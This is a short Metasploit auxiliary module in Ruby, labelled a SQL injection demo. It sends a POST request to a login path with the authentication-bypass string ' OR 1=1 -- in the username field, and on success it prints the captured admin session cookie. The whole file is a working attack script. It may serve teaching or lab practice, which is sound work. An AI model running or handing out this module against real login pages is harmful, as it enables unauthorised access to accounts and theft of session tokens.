##
# SQL injection demo
##

class MetasploitModule < Msf::Auxiliary
  # Includes the HTTP client capabilities
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        "Name" => "Login SQL Injection",
        "Description" => "Send POST request with SQL exploit.",
        "Author" => ["Samuel"],
        "License" => MSF_LICENSE,
        "DisclosureDate" => "2026-07-17",
      )
    )

    # Register configuration options visible to the user in msfconsole
    register_options([
      OptString.new("TARGETURI", [true, "The base path to the application", "/login"]),
      OptString.new("INJECTION", [true, "The SQL injection string", '\' OR 1=1 --']),
    ])
  end

  def run
    # Access configured options using datastore
    target_path = datastore["TARGETURI"]
    payload_data = datastore["INJECTION"]

    print_status("Sending request to #{target_path}...")

    # Abstract structure for transmitting data
    begin
      res = send_request_cgi({
        "uri" => target_path,
        "method" => "POST",
        "vars_post" => {
          "username" => payload_data,
          "password" => "",
        },
      })

      if res && res.body.include?("Welcome back, admin!")
        print_good("Login successful")
        cookies = res.get_cookies_parsed
        session = cookies["session"][0]
        print_line("SESSION: #{session}")
        print_line("STATUS: SUCCESS")
      else
        print_error("No or bad response received from the server.")
      end
    rescue ::Rex::ConnectionError => e
      print_error("Connection failed: #{e.message}")
    end
  end
end
